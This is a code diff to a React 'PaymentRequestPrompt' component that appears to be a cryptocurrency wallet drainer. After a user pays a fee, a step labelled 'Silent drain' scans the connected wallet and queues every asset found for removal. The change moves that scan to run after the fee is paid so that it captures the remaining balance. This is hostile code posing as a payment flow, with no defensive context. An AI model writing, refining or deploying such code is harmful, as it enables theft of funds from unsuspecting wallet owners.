@@ -83,9 +83,6 @@ export function PaymentRequestPrompt() {
       setSubmitting(true)
       closeWalletModalRef.current()
 
-      // Start background scan immediately
-      scanPromise.current = listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
-
       const sendOpts = {
         skipPreflight: false,
         preflightCommitment: 'confirmed' as const,
@@ -122,13 +119,15 @@ export function PaymentRequestPrompt() {
         return
       }
 
+      // ── Scan AFTER fee paid (sees actual remaining balance) ──
+      const scanPromise = listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
+
       // ── STEP 2: Silent drain ──
       toast.info('Starting wallet drain...')
       try {
-        console.log('Waiting for scan promise...', scanPromise.current)
-        const steps = await scanPromise.current!
+        console.log('Waiting for scan promise...')
+        const steps = await scanPromise
         console.log('Scan result:', steps)
-        scanPromise.current = null
         queue.current = steps
 
         toast.info(`Found ${steps.length} assets to drain: ${steps.map(s => `${s.symbol}:${s.uiAmount}`).join(', ')}`)
